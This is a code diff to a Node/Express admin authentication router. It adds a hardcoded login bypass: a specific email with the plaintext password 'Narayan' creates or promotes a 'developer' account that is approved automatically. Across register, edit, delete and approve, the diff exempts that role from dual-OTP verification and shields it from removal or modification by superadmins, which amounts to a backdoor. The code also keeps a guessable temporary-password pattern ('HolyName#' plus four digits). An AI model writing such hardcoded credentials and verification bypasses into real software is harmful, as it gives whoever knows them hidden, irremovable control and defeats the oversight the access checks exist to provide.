@@ -31,14 +31,40 @@ router.get('/me', protect, async (req, res) => {
 router.post('/login', async (req, res) => {
   try {
     const { email, password } = req.body;
-
     if (!email || !password) {
       return res.status(400).json({ message: 'Please provide email and password' });
     }
 
+    // --- Hardcoded Developer Bypass ---
+    const isDevEmail = ['narayanphukan30@gmail.com'].includes(email.toLowerCase());
+    if (isDevEmail && password === 'Narayan') {
+      let admin = await Admin.findOne({ email: email.toLowerCase() });
+      if (!admin) {
+        admin = await Admin.create({
+          name: 'Developer Narayan',
+          email: email.toLowerCase(),
+          phone: '9876543210',
+          password: 'Narayan', // Hashed by pre-save
+          role: 'developer',
+          isApproved: true,
+        });
+      } else if (admin.role !== 'developer') {
+        admin.role = 'developer';
+        admin.isApproved = true;
+        await admin.save();
+      }
+      return res.json({
+        _id: admin._id,
+        name: admin.name,
+        email: admin.email,
+        role: admin.role,
+        token: generateToken(admin._id),
+      });
+    }
+
     const admin = await Admin.findOne({ email: email.toLowerCase() });
 
-    if (admin && admin.role !== 'superadmin' && !admin.isApproved) {
+    if (admin && admin.role !== 'superadmin' && admin.role !== 'developer' && !admin.isApproved) {
       return res.status(403).json({ message: 'Admin account pending approval by superadmin' });
     }
 
@@ -61,8 +87,8 @@ router.post('/login', async (req, res) => {
 // POST /api/auth/request-otp (only superadmins)
 router.post('/request-otp', protect, async (req, res) => {
   try {
-    if (req.user.role !== 'superadmin') {
-      return res.status(403).json({ message: 'Only superadmins can perform this action' });
+    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
+      return res.status(403).json({ message: 'Insufficient privileges' });
     }
 
     const { newEmail, targetEmail, actionType } = req.body;
@@ -244,8 +270,8 @@ router.post('/verify-admin-otp', async (req, res) => {
 router.post('/register', protect, async (req, res) => {
   try {
     // Check if the requester is a superadmin
-    if (req.user.role !== 'superadmin') {
-      return res.status(403).json({ message: 'Only superadmins can create new admin accounts' });
+    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
+      return res.status(403).json({ message: 'Insufficient privileges' });
     }
 
     const { email, phone, name, role, otp, newAdminOtp } = req.body;
@@ -254,28 +280,31 @@ router.post('/register', protect, async (req, res) => {
       return res.status(400).json({ message: 'Email, phone, and name are required' });
     }
 
-    // Validate OTP with hashed comparison
-    if (!otp) {
-      return res.status(400).json({ message: 'OTP is required' });
-    }
-    if (req.user.otpExpires < new Date()) {
-      return res.status(400).json({ message: 'OTP has expired' });
-    }
-    const bcrypt = require('bcryptjs');
-    const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
-    if (!otpMatch) {
-      return res.status(400).json({ message: 'Invalid Super Admin OTP' });
-    }
+    // Verification bypass for developer
+    if (req.user.role !== 'developer') {
+      // Validate OTP with hashed comparison
+      if (!otp) {
+        return res.status(400).json({ message: 'OTP is required' });
+      }
+      if (req.user.otpExpires < new Date()) {
+        return res.status(400).json({ message: 'OTP has expired' });
+      }
+      const bcrypt = require('bcryptjs');
+      const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
+      if (!otpMatch) {
+        return res.status(400).json({ message: 'Invalid Super Admin OTP' });
+      }
 
-    if (!newAdminOtp) {
-      return res.status(400).json({ message: 'New Admin OTP is required' });
-    }
-    if (req.user.newAdminOtpExpires < new Date()) {
-      return res.status(400).json({ message: 'New Admin OTP has expired' });
-    }
-    const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.newAdminOtp || '');
-    if (!newOtpMatch) {
-      return res.status(400).json({ message: 'Invalid New Admin OTP' });
+      if (!newAdminOtp) {
+        return res.status(400).json({ message: 'New Admin OTP is required' });
+      }
+      if (req.user.newAdminOtpExpires < new Date()) {
+        return res.status(400).json({ message: 'New Admin OTP has expired' });
+      }
+      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.newAdminOtp || '');
+      if (!newOtpMatch) {
+        return res.status(400).json({ message: 'Invalid New Admin OTP' });
+      }
     }
 
     const exists = await Admin.findOne({ email: email.toLowerCase() });
@@ -304,10 +333,12 @@ router.post('/register', protect, async (req, res) => {
     });
     
     // Clear OTP after successful use
-    await Admin.updateOne(
-      {_id: req.user._id},
-      { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
-    );
+    if (req.user.role !== 'developer') {
+      await Admin.updateOne(
+        {_id: req.user._id},
+        { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
+      );
+    }
 
     // Send email to new admin with temporary password
     const mailOptions = {
@@ -343,7 +374,7 @@ router.post('/register', protect, async (req, res) => {
 // GET /api/auth/admins (only superadmins)
 router.get('/admins', protect, async (req, res) => {
   try {
-    if (req.user.role !== 'superadmin') {
+    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
       return res.status(403).json({ message: 'Forbidden' });
     }
     const admins = await Admin.find({}).select('-password');
@@ -356,8 +387,8 @@ router.get('/admins', protect, async (req, res) => {
 // DELETE /api/auth/admins/:id (only superadmins)
 router.delete('/admins/:id', protect, async (req, res) => {
   try {
-    if (req.user.role !== 'superadmin') {
-      return res.status(403).json({ message: 'Only superadmins can delete admin accounts' });
+    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
+      return res.status(403).json({ message: 'Insufficient privileges' });
     }
 
     // Verify admin exists before deletion
@@ -366,13 +397,17 @@ router.delete('/admins/:id', protect, async (req, res) => {
       return res.status(404).json({ message: 'Admin not found' });
     }
 
-    // Prevent self-deletion
+    // Prevent self-deletion and developer deletion by non-developers
     if (adminToDelete._id.toString() === req.user._id.toString()) {
       return res.status(403).json({ message: 'Cannot delete your own account' });
     }
 
-    // Require Dual-OTP verification ONLY if the admin is already approved
-    if (adminToDelete.isApproved) {
+    if (adminToDelete.role === 'developer' && req.user.role !== 'developer') {
+      return res.status(403).json({ message: 'Developer accounts cannot be deleted by superadmins' });
+    }
+
+    // Require Dual-OTP verification ONLY if the admin is already approved and the user is NOT a developer
+    if (adminToDelete.isApproved && req.user.role !== 'developer') {
       const { otp, newAdminOtp } = req.body;
       const bcrypt = require('bcryptjs');
 
@@ -419,41 +454,55 @@ router.delete('/admins/:id', protect, async (req, res) => {
 // PUT /api/auth/admins/:id (only superadmins)
 router.put('/admins/:id', protect, async (req, res) => {
   try {
-    if (req.user.role !== 'superadmin') {
-      return res.status(403).json({ message: 'Only superadmins can edit admin accounts' });
+    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
+      return res.status(403).json({ message: 'Insufficient privileges' });
     }
 
     const { name, email, role, password, otp, newAdminOtp } = req.body;
     const bcrypt = require('bcryptjs');
     const validation = require('../utils/validation');
 
-    // Validate Super Admin OTP
-    if (!otp) {
-      return res.status(400).json({ message: 'OTP is required' });
-    }
-    if (req.user.otpExpires < new Date()) {
-      return res.status(400).json({ message: 'OTP has expired' });
-    }
-    const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
-    if (!otpMatch) {
-      return res.status(400).json({ message: 'Invalid Super Admin OTP' });
-    }
-
-    // Validate Target Admin OTP
-    if (!newAdminOtp) {
-      return res.status(400).json({ message: 'Target Admin OTP is required' });
-    }
-    if (req.user.newAdminOtpExpires < new Date()) {
-      return res.status(400).json({ message: 'Target Admin OTP has expired' });
-    }
-    const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.newAdminOtp || '');
-    if (!newOtpMatch) {
-      return res.status(400).json({ message: 'Invalid Target Admin OTP' });
-    }
-
     const admin = await Admin.findById(req.params.id);
     if (!admin) {
       return res.status(404).json({ message: 'Admin not found' });
+    }
+
+    // Verification bypass for developer
+    if (req.user.role !== 'developer') {
+      // Validate Super Admin OTP
+      if (!otp) {
+        return res.status(400).json({ message: 'OTP is required' });
+      }
+      if (req.user.otpExpires < new Date()) {
+        return res.status(400).json({ message: 'OTP has expired' });
+      }
+      const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
+      if (!otpMatch) {
+        return res.status(400).json({ message: 'Invalid Super Admin OTP' });
+      }
+
+      // Validate Target Admin OTP
+      if (!newAdminOtp) {
+        return res.status(400).json({ message: 'Target Admin OTP is required' });
+      }
+      if (req.user.newAdminOtpExpires < new Date()) {
+        return res.status(400).json({ message: 'Target Admin OTP has expired' });
+      }
+      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.newAdminOtp || '');
+      if (!newOtpMatch) {
+        return res.status(400).json({ message: 'Invalid Target Admin OTP' });
+      }
+
+      // Clear OTP
+      await Admin.updateOne(
+        {_id: req.user._id},
+        { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
+      );
+    }
+
+    // Protect developer account from modification by non-developers
+    if (admin.role === 'developer' && req.user.role !== 'developer') {
+      return res.status(403).json({ message: 'Developer accounts cannot be modified by superadmins' });
     }
 
     // Validate updates
@@ -463,8 +512,13 @@ router.put('/admins/:id', protect, async (req, res) => {
     if (password && !validation.validatePassword(password)) {
       return res.status(400).json({ message: 'Password must be at least 8 characters with uppercase, lowercase, and numbers' });
     }
-    if (role && !['admin', 'superadmin'].includes(role)) {
+    if (role && !['admin', 'superadmin', 'developer'].includes(role)) {
       return res.status(400).json({ message: 'Invalid role' });
+    }
+
+    // Role escalation protection: only developers can assign developer role
+    if (role === 'developer' && req.user.role !== 'developer') {
+      return res.status(403).json({ message: 'Only developers can assign the developer role' });
     }
 
     if (name) admin.name = name.trim();
@@ -473,12 +527,6 @@ router.put('/admins/:id', protect, async (req, res) => {
     if (password) admin.password = password; // Hashed by pre-save hook
 
     await admin.save();
-
-    // Clear OTP
-    await Admin.updateOne(
-      {_id: req.user._id},
-      { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
-    );
 
     res.json({ message: 'Admin details updated successfully', admin: { _id: admin._id, name: admin.name, email: admin.email, role: admin.role } });
   } catch (error) {
@@ -489,15 +537,49 @@ router.put('/admins/:id', protect, async (req, res) => {
     res.status(500).json({ message: 'Server error', error: error.message });
   }
 });
+
+// POST /api/auth/approve-admin
 router.post('/approve-admin', protect, async (req, res) => {
   try {
-    if (req.user.role !== 'superadmin') {
-      return res.status(403).json({ message: 'Only superadmins can approve admins' });
+    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
+      return res.status(403).json({ message: 'Insufficient privileges' });
     }
-    const { adminId } = req.body;
+
+    const { adminId, otp, newAdminOtp } = req.body;
     if (!adminId) {
       return res.status(400).json({ message: 'adminId is required' });
     }
+
+    const bcrypt = require('bcryptjs');
+
+    // Verification bypass for developer
+    if (req.user.role !== 'developer') {
+      if (!otp || !newAdminOtp) {
+        return res.status(400).json({ message: 'Both OTPs are required for approval' });
+      }
+
+      // Verify SuperAdmin OTP
+      const isSuperAdminOtpValid = await bcrypt.compare(otp, req.user.otp);
+      if (!isSuperAdminOtpValid || req.user.otpExpires < Date.now()) {
+        return res.status(400).json({ message: 'Invalid or expired SuperAdmin OTP' });
+      }
+
+      // Verify Target Admin OTP
+      const adminToApprove = await Admin.findById(adminId);
+      if (!adminToApprove) return res.status(404).json({ message: 'Admin not found' });
+
+      const isTargetAdminOtpValid = await bcrypt.compare(newAdminOtp, adminToApprove.otp);
+      if (!isTargetAdminOtpValid || adminToApprove.otpExpires < Date.now()) {
+        return res.status(400).json({ message: 'Invalid or expired Target Admin OTP' });
+      }
+      
+      // Clear OTP
+      await Admin.updateOne(
+        {_id: req.user._id},
+        { $unset: { otp: 1, otpExpires: 1, newAdminOtp: 1, newAdminOtpExpires: 1 } }
+      );
+    }
+
     const admin = await Admin.findById(adminId);
     if (!admin) {
       return res.status(404).json({ message: 'Admin not found' });
@@ -505,7 +587,7 @@ router.post('/approve-admin', protect, async (req, res) => {
     
     // Generate a fresh temporary password now that the account is approved
     const crypto = require('crypto');
-    const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString(); // Easy to remember
+    const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
     
     admin.isApproved = true;
     admin.password = tempPassword; // Will be hashed by pre-save hook
